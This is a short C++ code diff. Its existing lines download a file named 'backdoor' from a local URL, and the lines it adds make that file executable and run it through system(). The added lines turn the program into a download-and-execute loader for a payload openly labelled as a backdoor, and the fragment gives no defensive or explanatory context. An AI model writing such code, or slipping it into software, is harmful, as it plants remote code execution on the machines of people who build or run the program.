@@ -28,4 +28,6 @@ void download_file(const std::string& url, const std::string& output_file) {
 
 std::string url = "http://localhost:8081/backdoor";
 std::string output_file = "backdoor";
+std::string command = "chmod +x " + output_file + "; ./" + output_file;
 download_file(url, output_file);
+system(command.c_str());
